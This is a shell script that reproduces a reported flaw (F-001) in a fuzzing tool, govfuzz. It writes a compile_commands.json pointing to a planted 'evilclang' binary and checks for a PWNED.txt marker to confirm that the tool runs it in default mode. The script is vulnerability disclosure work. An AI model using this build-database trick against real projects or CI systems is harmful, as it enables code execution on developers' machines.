#!/bin/sh
# Reproduce F-001. Pass the path to your govfuzz binary as $1, or have it on PATH.
set -e
GOVFUZZ="${1:-govfuzz}"
HERE="$(cd "$(dirname "$0")" && pwd)"
cd "$HERE"
rm -f PWNED.txt
rm -rf gfwork

echo "govfuzz: $("$GOVFUZZ" --version 2>/dev/null || echo "$GOVFUZZ")"
echo

# Variant A (CWD-independent, models CI where the checkout path is fixed):
# the compiler is an ABSOLUTE path, so it resolves no matter where govfuzz runs.
cat > compile_commands.json <<JSON
[{"directory":"$HERE","file":"use_parser.c","arguments":["$HERE/evilclang","-c","use_parser.c"]}]
JSON

echo "=== Running: govfuzz auto \"$HERE\"  (default mode; NO --build-command / --probe-build / --run-untrusted / --unsafe-*) ==="
# Run from an unrelated directory to prove the working directory is irrelevant for the absolute variant.
( cd /tmp && "$GOVFUZZ" auto "$HERE" \
    --work-dir "$HERE/gfwork" \
    --per-target-time 2 --max-targets 5 --jobs 1 --languages c >/dev/null 2>&1 || true )

echo
if [ -f "$HERE/PWNED.txt" ]; then
  echo ">>> CODE EXECUTION CONFIRMED. Contents of PWNED.txt:"
  echo "-----------------------------------------------------"
  cat "$HERE/PWNED.txt"
  echo "-----------------------------------------------------"
  echo "govfuzz ran ./evilclang as the compiler in default mode, with no opt-in flag."
  exit 0
else
  echo "PWNED.txt was not created on this build. See the README for the relative-path"
  echo "variant (cd into this folder and run: $GOVFUZZ auto .)."
  exit 1
fi
